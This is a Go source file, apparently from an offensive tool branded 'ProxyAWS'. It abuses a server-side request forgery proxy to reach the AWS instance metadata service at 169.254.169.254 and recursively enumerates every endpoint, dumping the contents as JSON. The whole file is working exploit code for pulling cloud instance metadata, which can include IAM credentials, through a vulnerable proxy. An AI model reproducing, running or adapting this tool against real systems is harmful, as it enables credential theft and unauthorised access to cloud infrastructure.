package metadata

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

type AWSStructure struct {
	Children []interface{}
}

type Directory struct {
	Path     string
	Children []interface{}
}

type File struct {
	Path  string
	Value string
}

type Proxy struct {
}

var awsBaseURL string = "http://169.254.169.254/"
var proxyURL string

func banner() {
	colorReset := "\033[0m"
	colorOrange := "\033[38;5;208m"
	fmt.Println(string(colorOrange), `
 _____                 _____ _ _ _ _____ 
|  _  |___ ___ _ _ _ _|  _  | | | |   __|
|   __|  _| . |_'_| | |     | | | |__   |
|__|  |_| |___|_,_|_  |__|__|_____|_____|
                  |___|                  
				  `, string(colorReset))
}

type AWSJSON string

func (EnumerateAWS AWSJSON) ToFile(path string) {
	fmt.Println(EnumerateAWS)
}

func (EnumerateAWS AWSJSON) Print() {
	fmt.Println("\n" + EnumerateAWS)
}

func EnumerateAWS(proxyUrl string, encoder Encoder) (jsonStructure AWSJSON) {
	return enumerateAWSFull(proxyUrl, false, encoder)
}

func enumerateAWSFull(proxyUrl string, allVersions bool, encoder Encoder) (jsonStructure AWSJSON) {
	proxyURL = proxyUrl
	banner()
	fmt.Println("[+] Using Proxy: " + proxyURL)

	if !Verbose {
		fmt.Println()
	}

	awss := new(AWSStructure)
	awss.Children = make([]interface{}, 0)

	if allVersions {
		recursiveFetch(0, "", &awss.Children, encoder)
	} else {
		recursiveFetch(1, "latest/", &awss.Children, encoder)
	}

	fmt.Printf("\r[+] Enumeration Complete!\033[K\n")

	b, err := json.MarshalIndent(awss, "", "  ")
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Returning AWS Structure as JSON")
	return AWSJSON(string(b))
}

func recursiveFetch(depth int, path string, parent *[]interface{}, encoder Encoder) {
	status, items := fetchProxyData(proxyURL, awsBaseURL+path, encoder)
	if status == "200 OK" {
		for _, item := range items {
			if depth < 2 {
				item = item + "/"
			}
			fmt.Printf(spin(Verbose) + " Enumerating: " + path + item)
			if strings.HasSuffix(item, "/") {
				self := new(Directory)
				self.Path = path + item
				self.Children = make([]interface{}, 0)
				*parent = append(*parent, &self)
				recursiveFetch(depth+1, self.Path, &self.Children, encoder)
			} else {
				self := new(File)
				self.Path = path + item
				status, contents := fetchProxyData(proxyURL, awsBaseURL+self.Path, encoder)
				if status == "200 OK" {
					self.Value = strings.Join(contents, "\n")
				} else {
					self.Value = "404"
				}
				*parent = append(*parent, &self)
			}
		}
	}
}

func fetchProxyData(proxy, endpoint string, encoder Encoder) (status string, body []string) {
	proxy = createURL(proxy, endpoint, encoder)
	status, data := fetchURL(proxy)
	return status, data
}

func fetchURL(url string) (status string, body []string) {
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 100
	t.MaxConnsPerHost = 100
	t.MaxIdleConnsPerHost = 100

	httpClient := &http.Client{
		Timeout:   10 * time.Second,
		Transport: t,
	}
	resp, err := httpClient.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	lines := make([]string, 0)

	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		panic(err)
	}
	return resp.Status, lines
}

func createURL(proxy, endpoint string, encoder Encoder) string {
	proxy = strings.Replace(proxy, "{0}", encoder(endpoint), 1)
	return proxy
}
